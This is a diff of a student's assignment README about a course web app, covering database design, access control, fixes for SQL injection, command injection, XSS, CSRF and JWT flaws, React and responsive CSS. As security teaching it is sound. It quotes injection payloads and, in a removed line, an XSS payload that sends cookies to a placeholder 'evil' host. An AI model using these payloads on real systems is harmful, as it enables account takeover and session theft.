@@ -6,47 +6,48 @@ Answer each question below. Replace the blank lines with your response.
 
 **1. In general, writes such as changing grades should only occur on the smaller normalized tables. Explain why. Since SQLite does not support materialized views, we write to both the normalized and denormalized tables instead. What problem(s) could this introduce?**
 
-The normalized tables are the single source of truth: each fact (a grade, a student name, a course title) lives in exactly one row, so a write touches one place and cannot contradict itself. The denormalized tables are *derived* projections of that data, and the same fact may be copied across many rows (e.g. a course title is repeated for every student enrolled and every week of content). Writing there is much more expensive — one logical update can fan out to dozens of rows — and easy to get wrong.
+The normalized tables are the single source of truth: each fact (a grade, a student name, a course title) lives in exactly one row, so a write touches one place and cannot contradict itself. The denormalized tables are derived projections of that data, and the same fact may be copied across many rows. Writing there is much more expensive and easy to get wrong.
 
-Writing to both tables introduces the classic problems of denormalization. (a) Consistency: if the two writes ever diverge — a partial failure, a forgotten code path, a future migration — reads will silently return stale data, and the bug only surfaces when somebody notices a wrong grade on screen. We mitigate this with a transaction so both updates commit or neither does, but transactions don't help if a developer simply forgets to update one of the tables. (b) Write amplification: a single grade change now does at least two SQL statements; adding columns to other denormalized tables would multiply this further. (c) Maintenance burden: every new write path in the codebase has to know every denormalized table that mirrors the affected data, so the surface area for bugs grows with every feature.
+When writing to both tables, we have to consider some issues:
+1. Consistency: if the two writes ever diverge, then reads will silently return stale data, and somebody has to actually notice a wrong grade on screen. We mitigate this with a transaction so both updates commit or neither does.
+2. Write amplification: a single grade change now does at least two SQL statements. Adding columns to other denormalized tables would multiply this further. 
+3. Maintenance burden: every new write path in the codebase has to know every denormalized table that mirrors the affected data, so the number of bugs increases with every feature.
 
 
 
 **2. For each denormalized table you created, explain why you chose that specific set of columns. Why not include additional columns that might be useful later?**
 
-Each table contains only what its one route needs to return, plus the column(s) it filters or sorts by.
+Each table contains only what its one route needs to return, plus the columns it filters/sorts by.
 
-- `student_courses(login_uid, course_id, course_code, course_title, instructor)` — `login_uid` is the WHERE key for `GET /api/students/:uid/courses`; the other four are what the dashboard renders for each card.
+- `student_courses(login_uid, course_id, course_code, course_title, instructor)` — `login_uid` is the WHERE key for `GET /api/students/:uid/courses`. The other four are what the dashboard renders for each card.
 - `professor_courses(professor_uid, course_id, course_code, course_title, instructor)` — same shape, filtered by `professor_uid` for the professor dashboard. Built only from courses whose `professor_uid IS NOT NULL`.
 - `course_content(course_id, week_id, week_title, week_sort, entry_id, entry_title, entry_type, entry_url, entry_sort)` — `course_id` is the lookup key, the rest is exactly the joined week/entry payload the course view consumes. The two `*_sort` columns are kept because the client sorts on them.
-- `course_students(course_id, uid, name)` — minimal roster: the lookup key plus the two displayed fields. Email, role, etc. would just be dead weight here.
+- `course_students(course_id, uid, name)` — the lookup key plus the two displayed fields
 - `student_grades(login_uid, course_id, grade_id, assignment_id, assignment_name, score, sort_order)` — composite lookup key `(login_uid, course_id)`, the four fields the grades view shows, and `sort_order` so we can `ORDER BY` it.
 
-I deliberately *didn't* add "maybe useful later" columns like passwords, course timestamps, or week descriptions. The whole point of denormalizing is trading storage for read speed, and that trade only pays off as long as the rows stay narrow: wider rows mean fewer rows per page, worse cache locality, slower index scans, and bigger write amplification (every redundant column has to be kept in sync by every write that touches the source). If a future view needs a different shape, the right answer is a new denormalized table tailored to that view, not bloating an existing one and slowing every other reader.
+I didn't add "maybe useful later" columns like passwords, course timestamps, or week descriptions. The whole point of denormalizing is trading storage for read speed, and that trade only pays off as long as the rows stay narrow: wider rows mean fewer rows per page, worse cache locality, and slower index scans. If a future view needs a different shape, the right answer is a new denormalized table tailored to that view instead of slowing things down for the user.
 
 
 
 **3. Why not skip denormalization and just add indexes to the normalized tables?**
 
-Indexes speed up *finding* rows, but they don't eliminate the join itself. Even with perfect indexes, a route like `GET /api/courses/:courseId/content` still has to walk `week`, look up every matching row in `entry`, and assemble the result — that's O(rows-returned) random IO across two B-trees, plus the per-row work of executing the join. Routes like grades chain *three* tables (`grade` → `assignment` → filter by `course_id`), which compounds the cost. Indexes make each individual seek fast, but they can't pre-combine the columns.
+Indexes speed up finding rows, but they don't eliminate the join itself. Even with perfect indexes, a route like `GET /api/courses/:courseId/content` still has to walk `week`, look up every matching row in `entry`, and assemble the result. Routes like grades chain 3 tables (`grade` → `assignment` → filter by `course_id`), which increases the cost. Indexes make each individual seek fast, but they can't pre-combine the columns.
 
-A denormalized table flattens that work *once*, at write time. The read becomes a single index seek plus a sequential range scan on a single table with the join already materialized — no join logic at query time, and the rows we want are physically grouped together so SQLite reads them off disk in a tight contiguous burst. At a few hundred rows the difference is invisible; at tens of thousands of students and courses, where each course view might be loaded thousands of times per minute, eliminating the join is the difference between a query that scales and one that doesn't. The cost is exactly the tradeoff described in question 1: more storage, careful write handling.
+A denormalized table flattens that work once, at write time. The read becomes a single index seek plus a sequential range scan on a single table with the join already materialized — no join logic at query time, and the rows we want are physically grouped together so SQLite reads them off disk in a tight contiguous burst. When we have tens of thousands of students and courses, where each course view might be loaded thousands of times per minute, eliminating the join is what we need to scale.
 
 
 
 **4. Which users should be able to read which data? Which users should be able to write which data? For each API endpoint, describe who should have access and what kind of access they should have.**
 
-The general rule is *least privilege*: a request should be allowed only if the authenticated user has a legitimate reason to see or change the specific data identified in the URL. The `:uid` and `:courseId` in the path are user-supplied and cannot be trusted to identify the requester — the server has to compare them against the authenticated session.
+The general rule is least privilege: a request should be allowed only if the authenticated user has a legitimate reason to see or change the specific data identified in the URL. The `:uid` and `:courseId` in the path are user-supplied and cannot be trusted to identify the requester as the server has to compare them against the authenticated session.
 
-- `POST /api/login` — open to anyone (it's how you become authenticated), but it must actually verify the password.
-- `GET /api/students/:uid/courses` — read access only to the student whose `uid` matches the session, plus any professor who teaches one of the courses that student is enrolled in (and admins). No other student should be able to look up someone else's schedule by guessing a UID.
-- `GET /api/professors/:uid/courses` — read access to that professor; effectively low-sensitivity (which faculty teaches which course is often public), but still gated to authenticated users so it can't be scraped anonymously.
-- `GET /api/courses/:courseId/content` — read access to students enrolled in that course and the professor teaching it. A student not enrolled in CS 33 should not be able to read its slides; the server must check the enrollment, not trust the client to ask only for courses it should see.
-- `GET /api/courses/:courseId/students` — read access only to the professor teaching the course (and admins). This is the course roster — exposing it to other students would leak who's taking which class, which is a real privacy concern.
+- `POST /api/login` — open to anyone but it must actually verify the password
+- `GET /api/students/:uid/courses` — read access only to the student whose `uid` matches the session, plus any professor who teaches one of the courses that student is enrolled in
+- `GET /api/professors/:uid/courses` — read access to that professor
+- `GET /api/courses/:courseId/content` — read access to students enrolled in that course and the professor teaching it
+- `GET /api/courses/:courseId/students` — read access only to the professor teaching the course (and admins)
 - `GET /api/students/:uid/courses/:courseId/grades` — read access to that student (and only for their own UID) and the professor teaching that course. No student may ever read another student's grades.
-- `POST /api/grades` — write access only to the professor who teaches the course the affected grades belong to. Students must never be able to write grades, and a professor must not be able to write grades for a course they don't teach. The check needs to happen *per grade row*, not just "is the requester a professor" — being a professor is necessary but not sufficient.
-
-In all cases, write access implies read access on the same data, and admin/staff roles (if added later) would have broader access. Crucially, the current implementation enforces none of this — every endpoint trusts the URL parameters — so these access rules are what Part 2's "Broken Access Control" section will need to actually implement.
+- `POST /api/grades` — write access only to the professor who teaches the course the affected grades belong to. Students must never be able to write grades, and a professor must not be able to write grades for a course they don't teach
 
 
 
@@ -56,74 +57,74 @@ For each vulnerability, describe in your own words: (1) what the security hole i
 
 **HTTPS:**
 
-*Hole.* The server listens with plain `app.listen` over HTTP, so every byte between the browser and the server — including the login `uid`/`password` JSON body and the auth cookie — travels in cleartext. Anyone on the same Wi-Fi (coffee shop, dorm, conference) or any compromised network hop can read or modify the traffic, including stealing credentials and session cookies.
+*Hole.* The server used plain `app.listen` over HTTP, so the login body and auth cookie traveled in cleartext so anyone on the same network could read or modify them.
 
-*Fix.* I replaced `app.listen(...)` with `https.createServer({ key, cert }, app).listen(...)` and loaded a `mkcert`-generated cert/key pair for `localhost` from `./certs`. I also set `Strict-Transport-Security: max-age=15552000; includeSubDomains` so once a browser sees the site over HTTPS, it refuses to make plain-HTTP requests to it for six months. This works because TLS encrypts and integrity-protects the entire connection, and mkcert's locally-installed root CA makes the browser trust the development cert without warnings (so users aren't trained to "click through" cert errors in production).
+*Fix.* Replaced `app.listen` with `https.createServer({ key, cert }, app).listen(...)` using an `mkcert`-generated cert in `./certs`, and set `Strict-Transport-Security` so browsers refuse to fall back to HTTP. TLS encrypts and integrity-protects the whole connection.
 
 
 **SQL Injection:**
 
-*Hole.* The login route built its SQL by string interpolation: `` `SELECT ... WHERE uid = '${uid}' AND password = '${password}'` ``. Anything the user puts in those fields becomes part of the query. Submitting a `uid` of `' OR '1'='1' --` short-circuits the WHERE clause to "always true" and returns the first row in the table — instant login as that user, no password needed. The fallback `SELECT uid, name, role FROM login WHERE uid = '${uid}'` made it even worse: it would happily return a user record when the password didn't match.
+*Hole.* The login query was string-interpolated: `WHERE uid = '${uid}' AND password = '${password}'`. A `uid` of `' OR '1'='1' --` short-circuits the WHERE to true and logs in as the first row. 
 
-*Fix.* I rewrote the query as a parameterized prepared statement: `db.prepare('SELECT uid, name, role, password FROM login WHERE uid = ?').get(uid)`. better-sqlite3 sends the SQL template and the parameter values to the database separately, so the parameter is treated as a value, never parsed as SQL — apostrophes, comment markers, etc. are just literal characters. I also removed the second "look up by uid only" fallback so a wrong password is *always* a 401.
+*Fix.* Rewrote the query as a prepared statement (`WHERE uid = ?`). better-sqlite3 sends the parameter separately from the SQL, so quotes and comments are treated as literal characters, never parsed. Also dropped the fallback so a wrong password is always a 401.
 
 
 **Command Injection:**
 
-*Hole.* `/api/search` ran `execSync(\`grep -rl "${query}" public/\`)`, sending the user's `q` parameter directly to a shell. A query like `x"; touch /tmp/pwned; echo "` closes the quoted argument, runs an attacker-controlled command, and re-opens the quote. The attacker gets to run any shell command as the Node process — read files, exfiltrate the database, install a backdoor.
+*Hole.* `/api/search` ran `execSync(\`grep -rl "${query}" public/\`)`. A query like `x"; touch /tmp/pwned; echo "` closes the quoted argument and runs arbitrary shell commands as the Node process.
 
-*Fix.* I switched from `execSync` to `execFileSync('grep', ['-rlF', '--', query, 'public/'])`. `execFile` skips the shell entirely and passes argv to `grep` directly, so `query` is one literal argv element no matter what characters it contains. I added `-F` (fixed-string match, so regex metacharacters in the query don't matter) and `--` (so a leading `-` in `query` can't be interpreted as a grep flag), and I cap the query length at 200 characters. The endpoint now also requires authentication.
+*Fix.* Switched to `execFileSync('grep', ['-rlF', '--', query, 'public/'])`. `execFile` skips the shell, so `query` is one literal argv element. `-F` neutralizes regex metacharacters, `--` blocks flag injection, and the endpoint now requires auth and caps `query` at 200 chars.
 
 
 **Cross-Site Scripting (XSS):**
 
-*Hole.* Several places in the client interpolated server data straight into `innerHTML`: course code/instructor on the dashboard, week titles and entry links on the course page, assignment names on the grades view. If any of those strings ever contained markup — e.g. an attacker-controlled course title like `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` — the browser would parse it as HTML and execute the script in the victim's session. The `entry.url` value was also dropped straight into an `href`, which would let `javascript:alert(1)` run on click.
+*Hole.* The client interpolated server data straight into `innerHTML` (course code, week title, assignment name, entry URL). A malicious value would execute in the victim's session, and `entry.url` going into `href` would let `javascript:` URLs run on click.
 
-*Fix.* Two layers. (1) On the client, the dashboard now builds course cards with `document.createElement` and `textContent`, which inserts data as a text node so HTML is never parsed; the places that still use string-templated `innerHTML` (grades tables, lecture entries) route every server value through an `escapeHtml()` helper that turns `&<>"'` into entities; and a `safeUrl()` helper rejects any URL scheme other than relative, `http(s)`, or `#`. (2) On the server, I send a strict `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`. Even if I missed an escape somewhere, the browser refuses to load or execute scripts from anywhere but our own origin and refuses to run inline scripts, which neutralises the typical XSS payload (`<script>...</script>` or `onerror=...`). Together: the escape stops the injection from ever reaching the DOM, and the CSP stops it from running if it does.
+*Fix.* Two parts: 
+1. Client: switched to `document.createElement` + `textContent` where possible, routed remaining `innerHTML` interpolations through an `escapeHtml()` helper, and guarded `href` with a `safeUrl()` helper that rejects non-`http(s)`/relative URLs. 
+2. Server sends a strict CSP (`default-src 'self'; script-src 'self'; …`) so the browser blocks off-origin and inline scripts even if an escape is missed.
 
 
 **Broken Authentication:**
 
-*Hole.* The server had no notion of "who is making this request." `/api/login` simply returned the user record on success and trusted the client to remember it; every subsequent request just took whatever UID was in the URL. Anyone could call `/api/students/987654321/courses` with no credentials and get Bob's data. Passwords were stored in plaintext, so a database leak immediately compromised every account (including any password those students reuse elsewhere), and the login form rendered passwords as `<input type="text">`, displaying them on screen as the user typed.
+*Hole.* No server-side session — `/api/login` just returned the user record and every subsequent request trusted whatever UID was in the URL. Passwords were stored in plaintext, and the login input was `type="text"` so it displayed on screen.
 
 *Fix.*
-- Passwords are now hashed with `bcrypt` at cost factor 12 during seed and verified with `bcrypt.compareSync` at login. bcrypt is salted and intentionally slow, so an attacker who steals the database still has to spend serious GPU time to crack each password individually rather than reversing them instantly.
-- Successful login signs a JWT (`HS256`, 2-hour TTL) containing `{ uid, role, name }` and sets it as a cookie with `HttpOnly` (JavaScript can't read it, so XSS can't exfiltrate it), `Secure` (only sent over HTTPS), `SameSite=Strict` (not sent on cross-site requests at all), and a 2-hour `Max-Age`.
-- Every protected route runs through a `requireAuth` middleware that reads the cookie, calls `jwt.verify` with an explicit `algorithms: ['HS256']` allowlist (this is *important* — without it, older versions accept `alg: none` and forged tokens), and rejects anything missing or invalid.
-- I also added the timing-safe comparison-against-a-dummy-hash trick: even when the user doesn't exist, the server runs a full bcrypt compare so login response time doesn't leak whether a given UID is registered.
-- The HTML password input is now `type="password"` so the browser masks the characters.
+- Passwords hashed with `bcrypt` at cost 12 and verified via `bcrypt.compareSync`
+- Login signs a JWT (`HS256`, 2-hour TTL) and sets it as a cookie with `HttpOnly` (XSS can't read it), `Secure` (HTTPS only), and `SameSite=Strict` (not sent cross-site)
+- A `requireAuth` middleware verifies the cookie on every protected route with `algorithms: ['HS256']` pinned
+- On a missing user, a dummy bcrypt compare runs anyway so response time doesn't leak whether the UID exists
+- Password input is now `type="password"`.
 
 
 **Broken Access Control:**
 
-*Hole.* Every endpoint trusted the `:uid` and `:courseId` in the URL. With authentication alone (the previous fix), Alice could log in legitimately and then call `/api/students/987654321/courses/2/grades` to read Bob's grades, or `POST /api/grades` to rewrite anyone's grades. The professor roster endpoint also leaked every student in a course to anyone who could guess the course ID. And the original login response handed back `role` and `name` to the *client*, meaning the client had to be trusted to decide what UI to show — but a client check can always be bypassed by hand-crafting requests.
+*Hole.* Endpoints trusted the `:uid` and `:courseId` in the URL. Authenticated as Alice, you could still call `/api/students/987654321/.../grades` to read Bob's grades, or `POST /api/grades` to rewrite anyone's.
 
-*Fix.* Every protected route now checks the authenticated user against the resource being accessed, server-side, regardless of what the URL says:
-- `GET /api/students/:uid/courses` — only allowed if `req.user.uid === req.params.uid`.
-- `GET /api/professors/:uid/courses` — same self-check, plus role must be `professor`.
-- `GET /api/courses/:courseId/content` — student must be enrolled in that course (verified against `student_courses`), or be the professor who teaches it (verified against `professor_courses`).
-- `GET /api/courses/:courseId/students` — only the professor teaching that course; students get 403. This is enforced with a `requireProfessor` middleware *and* a `professorTeachesCourse(req.user.uid, courseId)` check, because being a professor is necessary but not sufficient — Prof. A shouldn't see Prof. B's roster.
-- `GET /api/students/:uid/courses/:courseId/grades` — either the student themself, or the professor teaching that course.
-- `POST /api/grades` — only a professor, and *for each grade row submitted* we look up its course and verify the professor teaches it. A professor can't sneak in a write for a course they don't teach by bundling it with one they do.
-
-The shape of the rule is always: authenticated identity (from the JWT, not the URL) + relationship to the resource (from the database, not the request body). The client can request anything; the server is the gatekeeper.
+*Fix.* Every protected route now checks the authenticated user against the resource being accessed, server-side:
+- `GET /api/students/:uid/courses` — `req.user.uid === :uid`
+- `GET /api/professors/:uid/courses` — same self-check plus `role === 'professor'`
+- `GET /api/courses/:courseId/content` — enrolled student or teaching professor
+- `GET /api/courses/:courseId/students` — only the professor teaching that course
+- `GET /api/students/:uid/courses/:courseId/grades` — the student themself, or the course's professor
+- `POST /api/grades` — professor, plus a per-row check that they teach the course of each affected grade
 
 
 **Cross-Site Request Forgery (CSRF):**
 
-*Hole.* The server set `Access-Control-Allow-Origin: *`, `Allow-Headers: *`, and `Allow-Methods: *`. Combined with cookie-based auth (once added), this meant any third-party site could `fetch('https://localhost:3000/api/grades', { method: 'POST', credentials: 'include', ... })` and the browser would attach the victim's auth cookie. A malicious page open in another tab while a professor is logged in could silently overwrite grades; a page visited by a student could read their schedule.
+*Hole.* `Access-Control-Allow-Origin: *` with cookie auth meant any third-party page could `fetch(..., { credentials: 'include' })` and the browser would attach the victim's auth cookie silently overwriting grades or reading data.
 
-*Fix.* Three layers, each sufficient on its own against most attacks; together they're solid:
-1. **Cookie `SameSite=Strict`.** Modern browsers refuse to attach the cookie to *any* request originating from a different site. A cross-site `fetch` to our API simply arrives with no auth cookie and 401s.
-2. **Locked-down CORS.** I removed the `*` wildcards. The middleware now sets `Access-Control-Allow-Origin: https://localhost:3000` (and `Allow-Credentials: true`) *only* when the request's `Origin` exactly matches that, and never sends `*`. Browsers reject any credentialed response that doesn't echo back the requester's origin, so a `fetch` from `evil.example` can't read the JSON either way.
-3. **Explicit Origin check on state-changing requests.** A `requireSameOrigin` middleware rejects any non-GET request whose `Origin` (or `Referer`, as a fallback) doesn't start with our own origin, returning 403. This catches edge cases — older browsers, weird clients — and gives a clear server-side audit trail.
+*Fix.* Three parts:
+1. **`SameSite=Strict` cookie** — browsers don't attach it to cross-site requests, so they arrive unauthenticated and 401
+2. **Locked-down CORS** — the middleware only echoes `Access-Control-Allow-Origin` when `Origin` is our exact origin, and never sends `*`
+3. **`requireSameOrigin` middleware**
 
 
 **Dependency Vulnerabilities:**
 
-*Hole.* `npm audit` reported one high-severity advisory: `jsonwebtoken@8.5.1` is affected by three CVEs — most importantly **GHSA-qwph-4952-7xr6**, where `jwt.verify()` without an explicit `algorithms` option will accept a token signed with the `none` algorithm, so an attacker can forge a token by setting `alg: "none"` and presenting it without a signature. The other two advisories cover unrestricted key types and a public/private key confusion attack.
+*Hole.* `npm audit` flagged `jsonwebtoken@8.5.1` for three CVEs. `jwt.verify()` without an explicit `algorithms` option accepts `alg: none` tokens, letting an attacker forge a valid token with no signature.
 
-*Fix.* Upgraded to `jsonwebtoken@^9.0.3` (which removes the unsafe defaults), and as belt-and-suspenders I pass `{ algorithms: ['HS256'] }` explicitly to `jwt.verify` so even a regression couldn't enable `alg: none`. `npm audit` now reports zero vulnerabilities.
+*Fix.* Upgraded to `jsonwebtoken@^9.0.3` and pass `{ algorithms: ['HS256'] }` explicitly to `jwt.verify`. `npm audit` now reports zero vulnerabilities.
 
 
 
@@ -133,29 +134,21 @@ The shape of the rule is always: authenticated identity (from the JWT, not the U
 
 **5. Where does the expanded/collapsed state for each module live in your component hierarchy? Why did you put it there?**
 
-Each `Module` component owns its own `expanded` state via `useState(true)` — so the state lives at exactly the level of the thing it describes, with one boolean per week. No other component reads or writes it.
-
-I put it there because the React rule is "lift state up only as far as necessary": shared state goes to the closest common ancestor of the components that need it, and isolated state stays local. Toggling Week 1 doesn't affect Week 2, the parent `CourseContent` doesn't care which weeks are open, and nothing outside the modules view needs to know either. Lifting the state up to `CourseContent` and threading it back down via props/callbacks would be strictly worse — more boilerplate, more re-renders (toggling one week would re-render the parent and every sibling), and it would force a parent that has no business knowing about expand/collapse to carry that responsibility. Keeping the state in `Module` also means `Module` is a self-contained, reusable unit: drop one into any view and it just works.
-
-If a future feature needed "expand/collapse all" or "remember the last-opened week across navigations," that *would* be the trigger to lift the state up (to `CourseContent`) or out (to a context / parent component). Until that requirement exists, local state is the right level.
+Each `Module` owns its own `expanded` state via `useState(true)`. Nothing outside `Module` needs to know whether a given week is open as toggling Week 1 doesn't affect Week 2, and the parent `CourseContent` has no reason to care. Lifting it would mean more boilerplate, extra re-renders of unrelated siblings, and a parent carrying responsibility for something it doesn't use. If a future feature needed "expand all" or persistence across navigations, that would be the trigger to lift it.
 
 
 
 **6. What did React make easier compared to the vanilla JavaScript implementation? What did it make harder?**
 
 *Easier.*
-
-- **Rendering reads like the data structure.** The vanilla version built a string of HTML for entries, a sibling pair of `<div>`s for the header and body, attached an event listener, then `appendChild`ed each module. The React version is just `weeks.map(w => <Module week={w} />)` — the JSX *is* the tree. Adding a new field to a module would mean editing one place in JSX vs. editing the template string plus making sure all the surrounding escaping/event wiring still lines up.
-- **Local state is a one-liner.** Toggling a module went from "set a click handler on the header, walk to `nextElementSibling`, call `classList.toggle('collapsed')` on both" to `const [expanded, setExpanded] = useState(true)` plus `onClick={() => setExpanded(e => !e)}`. The class names are derived from state, so there's only ever one source of truth.
-- **XSS is mostly free.** `{entry.title}` is rendered as a text node — React refuses to interpret it as HTML — so I could delete the `escapeHtml(...)` wrappers I needed in the vanilla version. The only place that still needs care is the `href` (where `javascript:` URLs are dangerous), which I handle with a small `safeUrl` helper.
-- **Updates are minimal and automatic.** When toggling, only the affected `Module` re-renders, and React diffs its output against the live DOM. I never have to think about "what changed and what do I have to mutate."
+- **Rendering reads like the data.** `.map()` replaces a loop that built HTML strings, parsed them via `innerHTML`, and wired event listeners by hand.
+- **Local state is one line.** `const [expanded, setExpanded] = useState(true)` plus an `onClick` replaces "walk to `nextElementSibling` and toggle `.collapsed` on both."
+- **Updates are automatic.** Toggling re-renders only the affected `Module` and diffs against the live DOM — no manual mutation tracking.
 
 *Harder.*
-
-- **There's now a build step.** A vanilla `.js` file change reloads instantly. A `.jsx` change requires `npm run build:react` (or `--watch`) before the browser sees it. That's the cost of using JSX, and it's also why in-browser Babel (`<script type="text/babel">`) is tempting — but as the README notes, that requires `'unsafe-eval'` in the CSP, which would be a real security regression.
-- **Bundle size.** The unminified development build of `react` + `react-dom` is ~1.1 MB. The vanilla `loadModules` was a few hundred bytes of code. In production you'd add `--minify` and `--define:process.env.NODE_ENV=\"production\"` to drop that by an order of magnitude, but the assignment's build command keeps it simple.
-- **Bridging React and the rest of the page.** The sidebar stays vanilla and uses `document.getElementById('week-${id}')` to scroll to a module on click. That ID is now generated by React, which works fine because I put `id={\`week-${week.id}\`}` on the section — but it creates an implicit contract between two worlds. Worse, `grades.js` still does `container.innerHTML = '...'` when the user switches to the Grades view, which detaches the DOM out from under React. I handle that by calling `prior.unmount()` before remounting on the same container in `mountCourseContent`, but it's a sharp edge that a fully-React rewrite wouldn't have.
-- **The mental model is heavier.** Vanilla DOM manipulation is "tell the browser exactly what to do." React is "describe what you want; trust the runtime to reconcile." Most of the time that's a win, but for a 60-line component it's a lot of machinery. The payoff scales with feature count, not with the size of the current view.
+- **Build step.** A `.jsx` edit doesn't show up until `npm run build:react` runs
+- **Bundle size.** The unminified dev bundle of React + ReactDOM is 1.1 MB; the vanilla `loadModules` was a few hundred bytes
+- **Bridging to vanilla code.** The sidebar still calls `document.getElementById('week-${id}')` to scroll, so the React component has to keep emitting that ID
 
 
 
@@ -163,26 +156,27 @@ If a future feature needed "expand/collapse all" or "remember the last-opened we
 
 **7. For each media query breakpoint, explain why you chose that specific cutoff value and what layout or usability problem it solves. Describe the changes you made at each breakpoint in terms of the user experience (e.g. "the sidebar collapses into a hamburger menu because there isn't enough horizontal space to show it alongside the content"), not just the CSS properties you changed.**
 
-I used two cascading breakpoints — `max-width: 1024px` (tablet) and `max-width: 600px` (phone) — so the desktop layout is the default and each smaller bucket only overrides what actually breaks at that width.
+Two cascading breakpoints over the desktop default: `max-width: 1024px` (tablet) and `max-width: 600px` (phone).
 
-**Tablet — `max-width: 1024px`.** Chosen because an iPad in landscape is exactly 1024 CSS pixels and in portrait is 768, so this single rule catches the entire iPad envelope (and other small laptops / tablets). The desktop layout *almost* works on iPad — the dashboard grid is still happy, the course view still fits side-by-side — but two things felt cramped. First, the course sidebar (240 px on desktop) was eating ~31% of the iPad-portrait viewport, leaving the main reading area awkwardly narrow. So at this breakpoint the sidebar shrinks to a `clamp(10rem, 20vw, 12.5rem)` band, which gives the main content a noticeable amount of extra room without losing the at-a-glance week list. Second, the course-main padding (28 px / 36 px on desktop) felt unnecessarily generous next to a now-narrower main column, so I tightened it to `1.25rem 1.5rem`. Nothing else moves — the user experience is "the course view feels more balanced" rather than a structural change.
+**Tablet — 1024px.** Catches the iPad envelope (768 portrait, 1024 landscape). The side-by-side layout still works, but the 240px sidebar was eating ~31% of an iPad-portrait viewport and leaving the reading area cramped. The sidebar narrows and the main padding tightens, giving the content a noticeably wider reading area without a structural change.
 
-**Phone — `max-width: 600px`.** Chosen because a Pixel 10 reports 412 CSS pixels, and anything from a small phone (≤360 px) up to large phones in portrait (≤414 px) needs to fit, with a comfortable buffer up to 600. The side-by-side `course-sidebar | course-main` flex layout is the *load-bearing problem* at this width: a 200-px-wide sidebar plus a 200-px-wide content column gives you two unreadable narrow strips. So at 600 px and below, the course view stacks vertically — the sidebar flows above the main content as a short strip with the "← Dashboard" button, the course code, and the Modules/Grades nav — and the duplicate week-list inside the sidebar is hidden entirely (`#sidebar-modules { display: none }`) because the main pane already shows every week directly. The grades-view sidebar nav (Modules / Grades pills) is rotated from vertical-with-left-border to horizontal-with-bottom-border so the two tabs sit side by side instead of taking up two full rows. On the login screen the top margin shrinks (so the form isn't pushed below the fold on a phone). On the hacked screen the "PWNED!" box drops from a fixed `620px` to `min(38.75rem, 92vw)`, the title font scales down via `clamp`, and the terminal area becomes viewport-relative — without this it would horizontal-scroll on any phone. Course card images switch from a fixed `140px` height to `aspect-ratio: 16/6` so they shrink proportionally with the card width instead of letterboxing. The user experience: every screen scrolls vertically with nothing clipped off the right edge, and the most important action on each screen is reachable in the first viewport-height.
+**Phone — 600px.** The side-by-side `sidebar | main` layout is structurally broken here — two ~200px columns are unreadable — so the course view stacks vertically: the sidebar becomes a short strip on top (back button + course code + Modules/Grades nav), and the duplicate week list (`#sidebar-modules`) is hidden because the main pane already shows every week. The Modules/Grades nav rotates from vertical pills with left-borders to horizontal pills with bottom-borders. The hacked-screen "PWNED!" box drops from a fixed `620px` to `min(38.75rem, 92vw)` and its title scales via `clamp` — otherwise it would horizontal-scroll. The login form's top margin shrinks so it stays in the first viewport. Course banner images switch to `aspect-ratio` so they shrink with the card instead of letterboxing. Net effect: every screen scrolls only vertically, nothing clips off the right edge, and the primary action on each screen is reachable without scrolling.
 
-The cascade matters: at 412 px, both rules apply, with the phone rules overriding the tablet rules. That's why I only restate at the phone breakpoint the things that need to differ from the tablet treatment — most of the tablet shrinks (e.g. course-main padding) are then re-shrunk again at phone.
+The cascade matters: at 412px both rules apply, so phone-specific overrides only restate what needs to differ from the tablet treatment.
 
 
 
 **8. If you used AI for this part, what did you prompt it with, and what did you have to fix or adjust by hand?**
 
-I used Claude (this conversation) to do the CSS pass. The prompt was essentially: "complete part 4 in README.md" — the README itself spelled out the targets (iPad 768×1024 and Pixel 10) and the requirements (relative units, two breakpoints with meaningful changes, images must scale).
+I used Claude Code to help me with this part. I first prompted to "help me understand how to start part 4" and I understood the requirements and created a plan in Plan mode. CSS and this kind of responsive design has always been lots of trial and error and can be very difficult to do manually, so using AI was very helpful here.
 
-What Claude got right on the first pass: identifying the pixel-bound culprits (`.hacked-box` width: 620px, `.course-sidebar` width: 240px, `.course-card-img` height: 140px), picking sensible breakpoints (1024 and 600) that match the target devices, using `clamp()` for the type and padding values that need a floor and a ceiling, switching the course banner image from a fixed height to `aspect-ratio` so it scales proportionally with the card width, and using `minmax(min(260px, 100%), 1fr)` for the course grid (the `min(260px, 100%)` part is a well-known trick that prevents the column from being wider than the viewport — without it, on a viewport narrower than 260 px the grid would overflow horizontally).
+Got right on the first pass: spotting the pixel-bound culprits (`.hacked-box` 620px, `.course-sidebar` 240px, `.course-card-img` 140px), picking breakpoints aligned with the target devices, using `aspect-ratio` for the banner image, and using `minmax(min(260px, 100%), 1fr)` for the grid — `min(260px, 100%)` prevents horizontal overflow on viewports narrower than 260px.
 
-What I had to fix or adjust by hand:
+I had to fix some things after this first prompt like wiring a `--topbar-height` CSS custom property through `shared.css` and referencing it from `course.css`, so the layout follows the topbar shrinking at the phone breakpoint instead of leaving a 4-pixel background band.
 
-- I had Claude wire a `--topbar-height` CSS custom property through `shared.css` and reference it from `course.css`'s `min-height: calc(100vh - var(--topbar-height))`. Without that, the course-layout was using a hardcoded `52px` / `3.25rem`, which didn't update when the topbar shrank to `3rem` at the phone breakpoint — there was a 4-pixel band of background showing through at the bottom of the viewport. This is the kind of bug that's invisible until you actually open DevTools at a phone size, which is one of the limitations of doing CSS without seeing the result.
-- Visual testing is still on me: AI can write the rules, but only opening the page in Chrome DevTools at iPad-portrait, iPad-landscape, and Pixel-10 sizes will reveal things like "the course-main padding feels too tight here" or "the grade-input is too narrow for three digits." The CSS I committed is the first round; a fully polished pass would involve another round of tweaks after browser testing.
-
-What I learned: the `min(260px, 100%)` inside `minmax()` for grids is a real trick worth remembering. CSS custom properties (`var(--name)`) are the right tool any time two unrelated selectors need to agree on a value — they let you change one place and have a derived `calc()` follow it automatically. And `clamp(min, ideal, max)` for font sizes is much more readable than chains of `@media` rules adjusting `font-size`, *as long as* you're OK with the value scaling smoothly rather than stepping at named breakpoints.
+I learned the following:
+1. Using `min(260px, 100%)` inside `minmax()` is a useful grid trick
+2. CSS variables are the right tool when two unrelated selectors need to agree on a value
+3. `clamp()` replaces chains of `@media` font-size rules cleanly when smooth scaling is acceptable
+4. AI is incredibly useful and way more efficient when implementing responsive design in CSS
 
